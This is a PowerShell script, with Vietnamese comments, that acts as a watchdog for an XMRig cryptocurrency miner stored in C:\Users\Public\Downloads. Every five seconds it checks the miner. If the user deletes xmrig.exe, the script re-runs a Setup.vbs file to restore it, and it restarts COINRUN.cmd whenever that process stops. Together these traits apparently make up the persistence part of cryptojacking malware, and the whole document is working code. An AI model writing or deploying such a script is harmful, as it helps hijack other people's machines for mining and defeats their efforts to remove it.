$xmrigPath = "C:\Users\Public\Downloads\xmrig-6.22.2\xmrig.exe"
$setupPath = "C:\Users\Public\Downloads\Setup.vbs"
$coinRunPath = "C:\Users\Public\Downloads\xmrig-6.22.2\COINRUN.cmd"

function Start-CoinRun {
    $global:coinRunProcess = Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$coinRunPath`"" -PassThru
    Write-Host "coinrun.cmd START"
}

# Khởi chạy lần đầu nếu file tồn tại
if (Test-Path $xmrigPath) {
    Start-CoinRun
} else {
    Write-Warning "xmrig.exe không tồn tại ban đầu. Đang chạy Setup.vbs nếu có..."
    if (Test-Path $setupPath) {
        Start-Process -FilePath "wscript.exe" -ArgumentList "`"$setupPath`""
        Write-Host "Đã khởi chạy Setup.vbs"
    } else {
        Write-Error "Không tìm thấy Setup.vbs để phục hồi xmrig.exe"
    }
}

while ($true) {
    # 1. Giám sát file xmrig.exe
    if (!(Test-Path $xmrigPath)) {
        Write-Warning "xmrig.exe bị xóa. Đang chạy lại Setup.vbs..."

        if (Test-Path $setupPath) {
            Start-Process -FilePath "wscript.exe" -ArgumentList "`"$setupPath`""
            Write-Host "Đã khởi chạy lại Setup.vbs!"
        } else {
            Write-Error "❌ Không tìm thấy Setup.vbs tại: $setupPath"
        }
    }

    # 2. Giám sát tiến trình coinrun.cmd
    if ($global:coinRunProcess -and $global:coinRunProcess.HasExited) {
        Write-Warning "coinrun.cmd STOP. Reboot..."
        Start-CoinRun
    } elseif ($global:coinRunProcess) {
        Write-Host "coinrun.cmd running..."
    }

    Start-Sleep -Seconds 5
}
